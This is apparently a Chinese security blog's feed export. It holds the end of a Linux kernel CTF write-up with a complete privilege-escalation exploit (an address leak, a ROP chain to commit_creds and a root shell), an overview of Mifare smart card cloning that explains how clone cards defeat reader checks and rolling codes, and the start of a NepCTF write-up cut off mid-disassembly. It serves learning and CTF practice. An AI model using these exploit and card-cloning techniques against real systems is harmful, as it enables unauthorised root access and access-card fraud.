class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getshell</span><span class="hljs-params">()</span>  <br>&#123;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;****getshell****&quot;</span>);  <br>system(<span class="hljs-string">&quot;id&quot;</span>);  <br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);  <br>&#125; <br><br><span class="hljs-type">u_int64_t</span> user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__ (<span class="hljs-string">&quot;.intel_syntax noprefix\n&quot;</span>);<br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;\</span></span><br><span class="hljs-string"><span class="hljs-params">         mov user_ss, ss;\</span></span><br><span class="hljs-string"><span class="hljs-params">         mov user_gs, gs;\</span></span><br><span class="hljs-string"><span class="hljs-params">         mov user_ds, ds;\</span></span><br><span class="hljs-string"><span class="hljs-params">         mov user_es, es;\</span></span><br><span class="hljs-string"><span class="hljs-params">         mov user_rsp, rsp;\</span></span><br><span class="hljs-string"><span class="hljs-params">         pushf;\</span></span><br><span class="hljs-string"><span class="hljs-params">         pop user_rflags&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] got user stat\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;    <br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/test&quot;</span>,O_RDWR);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">546</span>] = <span class="hljs-string">&quot;\x9e\x8d\x8e\xa0\xb1\x98\x94\xae\xcd\xac\xcb\x80\xa8\xc0\xb5\xa8\x83\x9f\xbf\xb3\xaa\x97\x9a\x9f\xb1\x9e\xbf\x9f\xcc\xa9\x93\x9a&quot;</span>;<br>    ioctl(fd,<span class="hljs-number">0xDEADBEEF</span>,key);<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">size_t</span> kernel_buffer[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">30</span>;j++)&#123;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++)&#123;<br>    key[<span class="hljs-number">32</span>+j*<span class="hljs-number">8</span>+i] ^= <span class="hljs-number">0xf9</span>;<br>    &#125;<br>    kernel_buffer[j] = *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(key+<span class="hljs-number">32</span>+j*<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_buffer[%d] = 0x%llx\n&quot;</span>,j,kernel_buffer[j]);<br>    &#125;<br>    <span class="hljs-type">size_t</span> kernel_leak = kernel_buffer[<span class="hljs-number">21</span>];<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>; <br>    <span class="hljs-type">size_t</span> offset = kernel_leak - <span class="hljs-number">0x32A555</span> - raw_vmlinux_base;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_offset = 0x%llx\n&quot;</span>,offset);<br>    <span class="hljs-type">size_t</span> prepare_kernel_cred = raw_vmlinux_base + offset + <span class="hljs-number">0xCFBE0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prepare_kernel_cred = 0x%llx\n&quot;</span>,prepare_kernel_cred);<br>    <span class="hljs-type">size_t</span> commit_cred = raw_vmlinux_base + offset + <span class="hljs-number">0xCF720</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_cred = 0x%llx\n&quot;</span>,commit_cred);<br>    <span class="hljs-type">size_t</span> run_cmd = raw_vmlinux_base + offset + <span class="hljs-number">0xd02d0</span>;<br>    <br>    <br>    <span class="hljs-type">size_t</span> leak = *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(key+<span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;module_base = 0x%llx\n&quot;</span>,leak);<br>    <span class="hljs-type">size_t</span> rdi_from_rax = leak + <span class="hljs-number">0x9</span>;<br>    <span class="hljs-type">size_t</span> mov_cr4_rdi = leak + <span class="hljs-number">0xd</span>;<br>    <span class="hljs-type">size_t</span> swapgs = leak + <span class="hljs-number">0x11</span>;<br>    <span class="hljs-type">size_t</span> iretq = leak + <span class="hljs-number">0x15</span>;<br>    <span class="hljs-type">size_t</span> retn = leak + <span class="hljs-number">0x17</span>;<br>    <span class="hljs-type">size_t</span> eax_r12_rbp = leak + <span class="hljs-number">0x2c3</span>;<br>    <span class="hljs-type">size_t</span> printk_rbp = leak + <span class="hljs-number">0x7C</span>;<br>    <span class="hljs-type">size_t</span> rsp_from_rax = leak + <span class="hljs-number">0x282</span>;<br>    <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = <span class="hljs-string">&quot;\x9e\x8d\x8e\xa0\xb1\x98\x94\xae\xcd\xac\xcb\x80\xa8\xc0\xb5\xa8\x83\x9f\xbf\xb3\xaa\x97\x9a\x9f\xb1\x9e\xbf\x9f\xcc\xa9\x93\x9a&quot;</span>;<br>    <span class="hljs-type">size_t</span> ROP[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    save_status(); <br>    signal(SIGSEGV, getshell);<br>    i=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    ROP[i++] = eax_r12_rbp;</span><br><span class="hljs-comment">    ROP[i++] = (size_t)0x6f0;</span><br><span class="hljs-comment">    ROP[i++] = (size_t)0;    </span><br><span class="hljs-comment">    ROP[i++] = eax_r12_rbp;</span><br><span class="hljs-comment">    ROP[i++] = (size_t)0x6f0;</span><br><span class="hljs-comment">    ROP[i++] = (size_t)0;</span><br><span class="hljs-comment">    ROP[i++] = rdi_from_rax;</span><br><span class="hljs-comment">    ROP[i++] = mov_cr4_rdi;</span><br><span class="hljs-comment">    */</span><br>    ROP[i++] = eax_r12_rbp;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0x0</span>;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;    <br>    ROP[i++] = eax_r12_rbp;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0x0</span>;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    ROP[i++] = rdi_from_rax;<br>    ROP[i++] = prepare_kernel_cred;<br>    <br>    ROP[i++] = rdi_from_rax;<br>    ROP[i++] = commit_cred;<br>    ROP[i++] = swapgs;<br>    ROP[i++] = iretq;<br>    ROP[i++] = getshell;<br>    ROP[i++] = user_cs;<br>    ROP[i++] = user_rflags;<br>    ROP[i++] = user_rsp;<br>    ROP[i++] = user_ss;<br>    <br>    <span class="hljs-type">int</span> ROP_len = i*<span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;ROP_len;i++)&#123;<br>    *((<span class="hljs-type">char</span>*)ROP+i) ^= <span class="hljs-number">0xf9</span>;<br>    &#125;<br>    <span class="hljs-built_in">strcat</span>(payload,(<span class="hljs-type">char</span>*)ROP);    <br>    ioctl(fd,<span class="hljs-number">0xFEEDFACE</span>,payload);    <br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>Linux kernel</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能卡安全概览</title>
    <link href="/2024/09/04/%E6%99%BA%E8%83%BD%E5%8D%A1%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/"/>
    <url>/2024/09/04/%E6%99%BA%E8%83%BD%E5%8D%A1%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<h1 id="智能卡安全概览"><a href="#智能卡安全概览" class="headerlink" title="智能卡安全概览"></a>智能卡安全概览</h1><p>智能卡是一种通过内嵌芯片实现的携带个体信息的身份识别卡。IOT安全研究中智能门锁、智能汽车等都会涉及智能卡。</p><h2 id="智能卡分类"><a href="#智能卡分类" class="headerlink" title="智能卡分类"></a>智能卡分类</h2><p>从读取机制上，智能卡分为接触式和非接触式。接触式智能卡如银行卡，通常芯片暴露在表面；非接触式智能卡内置芯片和通信线圈，没有裸露部分。在应用上，非接触式智能卡更加广泛，外形有卡贴、首饰、薄卡、钥匙卡等。</p><p>从通讯频率上，智能卡分为125KHz低频(LF)、13.56MHz高频(HF)、868MHz-915Mhz超高频(UHF)，低频卡又称ID卡，高频卡又称IC卡。频率越高，波长越小，能携带的信息越多，传输距离越远。</p><ul><li><p>ID卡：频率有125KHz、250KHz、375KHz、500KHz，多为125KHz；只存储卡号；芯片出产后卡号不可修改；卡片类ID卡多为圆线圈；和IC卡相比线圈大芯片小</p></li><li><p>IC卡：频率有13.56MHz、868MHz，多为13.56MHz；存储卡号及其它数据；可由授权用户反复擦写；卡片类IC卡多为方线圈；和ID卡相比线圈小芯片大</p></li></ul><p>各频率的加密情况和市场占有率如图(<a href="https://www.bilibili.com/video/BV1QF411r7mw/?spm_id_from=333.788&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">图片来源</a>):</p><p><img src="/2024/09/04/%E6%99%BA%E8%83%BD%E5%8D%A1%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/QQ%E6%88%AA%E5%9B%BE20240901231032.png" alt="1"></p><p>非接触式智能卡是RFID技术的一种应用，各个频带的非接触式智能卡都属于RFID卡。RFID技术中各个频率的应用如下(<a href="https://zh.wikipedia.org/wiki/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB">图片来源</a>)：</p><p><img src="/2024/09/04/%E6%99%BA%E8%83%BD%E5%8D%A1%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/QQ%E6%88%AA%E5%9B%BE20240901224715.png" alt="2"></p><h2 id="RFID和NFC"><a href="#RFID和NFC" class="headerlink" title="RFID和NFC"></a>RFID和NFC</h2><ul><li><p>RFID，全称Radio Frequency Identification(射频识别)，是由雷达技术衍生出的一种无线通信技术。RFID系统包括读写器(Reader)、标签(Tag)和数据管理系统三个部分，标签中存储ID和个体信息，读写器读写其中内容进行识别，并与数据管理系统交互进行数据管理和处理。读写器和标签间采用各个频率的无线电波进行通信。</p></li><li><p>NFC，全称Near-field communication(近场通信)，是一套短距高频无线通信的标准。NFC由RFID演变而来，同样使用无线电波进行通信，但是仅在13.56MHz工作，通信距离一般在10cm以内。NFC兼容了RFID，NFC设备能够模拟为IC卡被读卡器识别。除此之外，NFC还能作为非接触读卡器读取别的标签，两个NFC设备之间能够实现点对点通信。</p></li></ul><p>二者最显著的不同在于：</p><ul><li><p>RFID在各个频率都有应用，而NFC只工作在13.56MHz。</p></li><li><p>RFID中只能由读取器单向对标签进行读写，而NFC中设备能够相互读写。</p></li></ul><p>NFC在13.56MHz兼容RFID，因此带有NFC芯片的设备也能识别13.56MHz的IC卡。</p><p>还有一种专门为NFC标准定制的卡称为NTAG卡，该类卡能被所有NFC设备读取，但是无法被无NFC功能的RFID读卡器识别。</p><h2 id="IC分类及复制卡检测机制"><a href="#IC分类及复制卡检测机制" class="headerlink" title="IC分类及复制卡检测机制"></a>IC分类及复制卡检测机制</h2><p>ID卡仅存储ID且不加密，价格低廉，没有安全性可言，因此破解方面主要讨论IC卡。</p><h3 id="ISO-x2F-IEC-14443-A-x2F-B"><a href="#ISO-x2F-IEC-14443-A-x2F-B" class="headerlink" title="ISO&#x2F;IEC 14443 A&#x2F;B"></a>ISO&#x2F;IEC 14443 A&#x2F;B</h3><p>国际标准化组织（ISO）和国际电子技术委员会（IEC）制定了非接触式IC卡的国际标准——ISO&#x2F;IEC14443。</p><p>该标准规定射频IC卡分为Type A和Type B两种卡型。Type A卡比Type B卡更常见，但是Type B卡通信抗干扰能力和安全性更强。目前的二代身份证，社保卡，护照等都是Type B卡，平时的饭卡、门禁卡、水卡、一卡通等大多是Type A卡。</p><p><a href="https://blog.csdn.net/lihenair/article/details/8025767">TypeA和TypeB的详细区别参考</a></p><h3 id="Mifare卡"><a href="#Mifare卡" class="headerlink" title="Mifare卡"></a>Mifare卡</h3><p>MIFARE是恩智浦半导体(NXP Semiconductors)拥有的商标之一，是一个全球化的非接触式智能卡巨头。MIFARE包括一系列依循ISO&#x2F;IEC 14443-A规格，利用无线射频识别（频率为13.56MHz）的多种非接触式智能卡专有解决方案。</p><ul><li><p>M1卡</p><p>M1卡是使用M1芯片封装的逻辑加密IC卡。M1芯片全称NXP Mifare1系列，常用的有S50(容量1K)及S70(容量4K)两种型号。</p></li></ul><p>M1卡是世界上使用量最大的非接触式IC卡。从M1卡进入中国市场开始，在复制和防复制的对抗过程中演变出了各种各样的检测机制和各类沿用M1数据结构的复制卡。</p><p>目前针对IC卡破解的对抗手段有扇区加密、防火墙、滚动码和服务器数据校验等，还有直接脱离逻辑加密IC卡范畴的CPU卡，通过内置微机使其能够实现更复杂的保护机制。目前市场上逻辑加密IC卡仍是主流，但CPU卡破解难度最高，是以后的趋势，恩智浦也推出了CPU卡产品 - Mifare Plus。</p><p>各Mifare卡的SAK值如下</p><p><img src="/2024/09/04/%E6%99%BA%E8%83%BD%E5%8D%A1%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/QQ%E6%88%AA%E5%9B%BE20240903234801.png" alt="3"></p><h3 id="防火墙绕过"><a href="#防火墙绕过" class="headerlink" title="防火墙绕过"></a>防火墙绕过</h3><p>M1卡将存储空间划分为多个扇区，又将每个扇区划分为多个区块，都从0开始编号。标准M1卡的第0个扇区的第0个区块存放了卡号(UID)、卡号校验位(BCC)、芯片类型(SAK)、应答类别(ATQA)和生产厂商信息，厂商读卡时对这些信息进行校验。0区块不可修改，其它扇区验证后可反复修改。通过修改0区块，就能复制和伪造M1卡。</p><ul><li><p>UID复制卡：可以通过后门指令重复擦写所有扇区。</p><p>读卡系统通过检测卡片对后门指令的回应识别UID卡，因此UID卡几乎无法绕过任何防火墙。</p></li><li><p>CUID复制卡：可以经过常规密码验证后使用普通指令擦写0区块，绕过了对UID卡的检测。</p><p>读卡系统通过尝试擦写0区块识别CUID卡，可擦写是复制卡，不可擦写是正常卡。CUID卡可以绕过部分防火墙。</p><p>此外，由于CUID卡擦写需要经过密码验证，写错数据有可能破坏验证信息变成废卡，无法再修复。</p></li><li><p>FUID复制卡：只能修改一次0区块，通过修改一次后锁0区块绕过了对CUID卡的检测。</p><p>读卡系统很难识别FUID卡，锁卡后FUID卡就是标准M1卡。FUID卡可以绕过大部分防火墙。</p></li><li><p>UFUID复制卡： UID卡和FUID卡的结合体，可以手动控制是否锁定，不锁定就是UID卡，锁定后就是标准M1卡，锁定后无法再解锁。同样可以绕过大部分防火墙。</p></li></ul><h3 id="滚动码绕过"><a href="#滚动码绕过" class="headerlink" title="滚动码绕过"></a>滚动码绕过</h3><p>滚动码原理：厂商在卡片中增加数据标识，每次刷卡数据标识发生变化，比如刚开始是0，刷一次变成1，再刷一次变成2，0-9不断循环。</p><ul><li>GTU&#x2F;GUID&#x2F;GID&#x2F;GPU卡：这些卡是同一种卡，统称GTU卡。GTU卡通过修改扇区的控制字节将保存滚动码的数据块设置为只读，使读卡器更新滚动码失败。</li></ul><p>针对部分存在漏洞的滚动码系统，可以使用GTU卡绕过：</p><ul><li><p>漏洞1：读卡器中没有新办卡的滚动码记录，无法校验滚动码的初始值。因此读卡器读到卡的滚动码为初始值时不会进行校验，默认识别为正常卡(新卡或复位卡)。使用GTU卡复制一张新办卡或复位卡即可利用该漏洞绕过滚动码检测。</p></li><li><p>漏洞2：读卡的流程是，读卡器向卡中写入更新后的滚动码，再将卡中的新滚动码读入读卡器，下次刷卡时，检查滚动码与读卡器中保存的是否相同，不相同则判定为非法的复制卡。如果更新时写卡失败，有的读卡器不保存更新后的滚动码，有的读卡器保存卡中未更新的滚动码，这两种情况都导致刷卡完成后滚动码不更新，存在漏洞。使用GTU卡或者手动修改控制字节让卡的滚动码更新时写卡失败，就能绕过滚动码检测。</p></li></ul><p>针对上述漏洞，有对应的防御手段：</p><ul><li>防御漏洞1：有的系统不需要初始值来判断是否的第一次刷卡，自身存储内没有刷卡记录，则认为是首次刷卡。复位值也不一定存在，有的系统没有设计复位功能。</li><li>防御漏洞2：一旦写卡失败直接终止刷卡流程或者将新滚动码先保存在临时变量再存入读卡器内存，而非从卡片中读取新滚动码。</li><li>滚动码暗桩：添加数据位以增加系统的复杂程度，例如新增一处数据用于标识滚动码的循环次数。</li></ul><p>因此针对滚动码防护，GTU卡作用有限，最优解是破解系统发卡流程实现自主发卡。</p><h3 id="内置微机防复制"><a href="#内置微机防复制" class="headerlink" title="内置微机防复制"></a>内置微机防复制</h3><ul><li><p>CPU卡：卡内集成电路中包括中央处理器（CPU）、只读存储器（ROM）、随机存取存储器(RAM)、电可擦除可编程只读存储器（EEPROM）以及片内操作系统（COS）等主要部分，比普通IC卡多了CPU和COS，相当于一台微型电脑。CPU卡容量大、能执行指令，可以实现复杂的加密，目前没有公开的破解手段。</p></li><li><p>CPU模拟卡:部分CPU卡，部分M1卡，如复旦FM1208(7k CPU + 1K M1)。目前公开资料中只能破解其M1卡部分。</p></li></ul><p>SAK值为28的大部分是CPU模拟卡，少部分是CPU卡；SAK值为20大部分是CPU卡，小部分是国产CPU模拟卡。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文查阅网上各种资料介绍了智能卡的分类和攻防现状，下一篇文章梳理智能卡的破解方法。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.bilibili.com/video/BV1QF411r7mw">[bilibili] 手把手教你玩转IC卡</a></p><p><a href="https://blog.csdn.net/ladeng07/article/details/128872807">[LMark’s blog] 各种IC卡ID卡详解</a></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>智能卡</tag>
      
      <tag>硬件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024NepCTFwriteup</title>
    <link href="/2024/08/26/2024NepCTFwriteup/"/>
    <url>/2024/08/26/2024NepCTFwriteup/</url>
    
    <content type="html"><![CDATA[<h1 id="2024NepCTF-writeup"><a href="#2024NepCTF-writeup" class="headerlink" title="2024NepCTF writeup"></a>2024NepCTF writeup</h1><p>拿了两个hardware的2血，一个pwn的3血，第10名</p><p><img src="/2024/08/26/2024NepCTFwriteup/1.png" alt="1"></p><h2 id="hrpos"><a href="#hrpos" class="headerlink" title="hrpos"></a>hrpos</h2><p>实现了一个最小的操作系统，并使用qemu运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    pkill -f qemu<br>    qemu-system-x86_64 \<br>        -m 1M \<br>        -drive file=/home/nepkernel/floppy.img,format=raw,<span class="hljs-keyword">if</span>=floppy \<br>        -monitor /dev/null \<br>        -serial tcp::8866,server,nowait \<br>        -nographic \<br>        -smp cores=1,threads=1 \<br>        -cpu qemu64 2&gt;/dev/null &amp;<br>    <span class="hljs-built_in">sleep</span> 20<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>提取kernel.bin</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=floppy.img <span class="hljs-attribute">of</span>=extracted_kernel.bin <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">skip</span>=1 <span class="hljs-attribute">count</span>=2879<br></code></pre></td></tr></table></figure><p>ida分析后通过系统调用发现是16位boot程序，用16位打开，sub_22输出si指向的字符串</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tcl">seg000:<span class="hljs-number">0000</span>                               sub_0 <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>                         ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> sub_0+20↓j</span><br>seg000:0000 31<span class="hljs-title"> C0</span> <span class="hljs-title">                        xor</span> <span class="hljs-title">    ax,</span> ax<span class="hljs-title"></span><br><span class="hljs-title">seg000:0002</span> 8E<span class="hljs-title"> D8</span> <span class="hljs-title">                        mov</span> <span class="hljs-title">    ds,</span> ax<span class="hljs-title"></span><br><span class="hljs-title">seg000:0004</span> 8E<span class="hljs-title"> C0</span> <span class="hljs-title">                        mov</span> <span class="hljs-title">    es,</span> ax<span class="hljs-title"></span><br><span class="hljs-title">seg000:0006</span> 8E<span class="hljs-title"> D0</span> <span class="hljs-title">                        mov</span> <span class="hljs-title">    ss,</span> ax<span class="hljs-title"></span><br><span class="hljs-title">seg000:0008</span> BC 00 7C<span class="hljs-title">                      mov</span> <span class="hljs-title">    sp,</span> 7C00h<span class="hljs-title"></span><br><span class="hljs-title">seg000:000B</span> BE 78 10<span class="hljs-title">                      mov</span> <span class="hljs-title">    si,</span> 1078h<span class="hljs-title"></span><br><span class="hljs-title">seg000:000E</span> E8 11 00<span class="hljs-title">                      call</span> <span class="hljs-title">   sub_22</span><br>seg000:000E<span class="hljs-title"></span><br><span class="hljs-title">seg000:0011</span> BE 8C 10<span class="hljs-title">                      mov</span> <span class="hljs-title">    si,</span> 108Ch<span class="hljs-title"></span><br><span class="hljs-title">seg000:0014</span> E8 0B 00<span class="hljs-title">                      call</span> <span class="hljs-title">   sub_22</span><br>seg000:0014<span class="hljs-title"></span><br><span class="hljs-title">seg000:0017</span> E8 44 00<span class="hljs-title">                      call</span> <span class="hljs-title">   sub_5E</span><br>seg000:0017<span class="hljs-title"></span><br><span class="hljs-title">seg000:001A</span> BE 9E 10<span class="hljs-title">                      mov</span> <span class="hljs-title">    si,</span> 109Eh<span class="hljs-title"></span><br><span class="hljs-title">seg000:001D</span> E8 02 00<span class="hljs-title">                      call</span> <span class="hljs-title">   sub_22</span><br>seg000:001D<span class="hljs-title"></span><br><span class="hljs-title">seg000:0020</span> EB<span class="hljs-title"> DE</span> <span class="hljs-title">                        jmp</span> <span class="hljs-title">    short</span> sub_0<span class="hljs-title"></span><br><span class="hljs-title">seg000:0020</span><br>seg000:0020<span class="hljs-title">                               sub_0</span> endp<br>...<span class="hljs-title"></span><br><span class="hljs-title">seg000:0078</span> 57 65 6C 63 6F 6D 65 20 74 6F+aWelcomeToMyOs<span class="hljs-title"> db</span> &#x27;Welcome<span class="hljs-title"> to</span> my<span class="hljs-title"> OS!&#x27;,0Dh,0Ah,0</span><br>seg000:008C 45 6E 74 65 72 20 63 6F 6D 6D+aEnterCommand<span class="hljs-title"> db</span> &#x27;Enter<span class="hljs-title"> command:</span> &#x27;,0Dh,0Ah,0<span class="hljs-title"></span><br><span class="hljs-title">seg000:009E</span> 55 6E 6B 6E 6F 77 6E 20 63 6F+aUnknownCommand<span class="hljs-title"> db</span> &#x27;Unknown<span class="hljs-title"> command!&#x27;,0Dh,0Ah,0</span><br>seg000:00B1 4E 65 70 43 54 46 7B 48 52 50+aNepctfHrpLocal<span class="hljs-title"> db</span> &#x27;NepCTF&#123;HRP_Local_test&#125;&#x27;<br></code></pre></td></tr></table></figure><p>发现存在后门直接输出flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">seg000</span>:<span class="hljs-number">002</span>E BE B1 <span class="hljs-number">10</span>                      mov     si, <span class="hljs-number">10</span>B1h<br><span class="hljs-attribute">seg000</span>:<span class="hljs-number">0031</span> E8 EE FF                      call    sub_22<br><span class="hljs-attribute">seg000</span>:<span class="hljs-number">0031</span><br><span class="hljs-attribute">seg000</span>:<span class="hljs-number">0034</span> C3                            retn<br></code></pre></td></tr></table></figure><p>sub_5E猜测read的时候di会自增，存在溢出</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs tcl">seg000:<span class="hljs-number">005</span>E                               sub_5E <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>                        ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> sub_0+17↑p</span><br>seg000:005E<span class="hljs-title"></span><br><span class="hljs-title">seg000:005E</span> <span class="hljs-title">                              var_10=</span> byte<span class="hljs-title"> ptr</span> -10h<span class="hljs-title"></span><br><span class="hljs-title">seg000:005E</span><br>seg000:005E 55<span class="hljs-title">                            push</span> <span class="hljs-title">   bp</span><br>seg000:005F 89<span class="hljs-title"> E5</span> <span class="hljs-title">                        mov</span> <span class="hljs-title">    bp,</span> sp<span class="hljs-title"></span><br><span class="hljs-title">seg000:0061</span> 83<span class="hljs-title"> EC</span> 10<span class="hljs-title">                      sub</span> <span class="hljs-title">    sp,</span> 10h<span class="hljs-title"></span><br><span class="hljs-title">seg000:0064</span> 8D 7E<span class="hljs-title"> F0</span> <span class="hljs-title">                     lea</span> <span class="hljs-title">    di,</span> [bp-10h]<span class="hljs-title"></span><br><span class="hljs-title">seg000:0064</span><br>seg000:0067<span class="hljs-title"></span><br><span class="hljs-title">seg000:0067</span> <span class="hljs-title">                              loc_67:</span>                                 ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> sub_5E+16↓j</span><br>seg000:0067<span class="hljs-title"> B4</span> 00<span class="hljs-title">                         mov</span> <span class="hljs-title">    ah,</span> 0<span 